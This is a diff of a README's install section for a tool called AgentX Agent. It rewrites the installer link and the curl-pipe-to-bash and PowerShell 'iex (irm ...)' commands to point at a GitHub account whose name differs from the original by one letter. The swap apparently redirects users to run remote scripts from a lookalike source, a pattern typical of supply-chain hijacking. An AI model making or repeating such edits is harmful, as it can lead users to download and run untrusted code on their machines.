@@ -48,21 +48,21 @@ Pick the row that matches your goal:
 
 ## 1. Install AgentX Agent
 ### With the AgentX Desktop installer on macOS or Windows (recommended)
-To easily install the command-line and desktop applications, [download the AgentX Desktop installer](https://github.com/matlek0409/AgentX/) from our website and run it.
+To easily install the command-line and desktop applications, [download the AgentX Desktop installer](https://github.com/matlee0409/AgentX/) from our website and run it.
 
 ### Without AgentX Desktop:
 For a command-line only install without AgentX Desktop, run:
 
 #### Linux / macOS / WSL2 / Android (Termux)
 ```bash
-curl -fsSL https://raw.githubusercontent.com/matlek0409/AgentX/main/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/matlee0409/AgentX/main/scripts/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://raw.githubusercontent.com/matlek0409/AgentX/main/scripts/install.ps1) 
+iex (irm https://raw.githubusercontent.com/matlee0409/AgentX/main/scripts/install.ps1) 
 ```
 
 :::tip Android / Termux
